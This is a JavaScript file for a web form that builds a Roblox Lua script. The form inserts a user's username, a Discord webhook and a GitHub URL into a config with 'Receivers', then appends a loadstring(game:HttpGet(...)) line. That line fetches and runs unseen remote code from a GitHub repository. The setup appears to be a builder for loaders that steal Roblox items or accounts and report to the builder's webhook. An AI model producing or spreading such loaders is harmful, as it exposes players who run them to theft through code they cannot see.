document.getElementById("scriptForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const github = document.getElementById("github").value.trim();
  const webhook = document.getElementById("webhook").value.trim();

  if (!github.startsWith("https://raw.githubusercontent.com/")) {
    alert("❌ GitHub raw URL must start with https://raw.githubusercontent.com/");
    return;
  }

  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
    alert("❌ Invalid Discord webhook URL.");
    return;
  }

  const luaScript = `
Config = {
  Receivers = {"${username}"},
  Webhook = "${webhook}",
  ScriptURL = "${github}",
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
`.trim();

  document.getElementById("scriptBox").textContent = luaScript;
  document.getElementById("output").classList.remove("hidden");

  document.getElementById("downloadBtn").onclick = () => {
    const blob = new Blob([luaScript], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "generated_script.lua";
    a.click();
    URL.revokeObjectURL(url);
  };

  document.getElementById("copyBtn").onclick = () => {
    navigator.clipboard.writeText(luaScript).then(() => {
      alert("✅ Script copied to clipboard!");
    });
  };
});

function toggleHelp() {
  const help = document.getElementById("helpContent");
  help.classList.toggle("hidden");
}
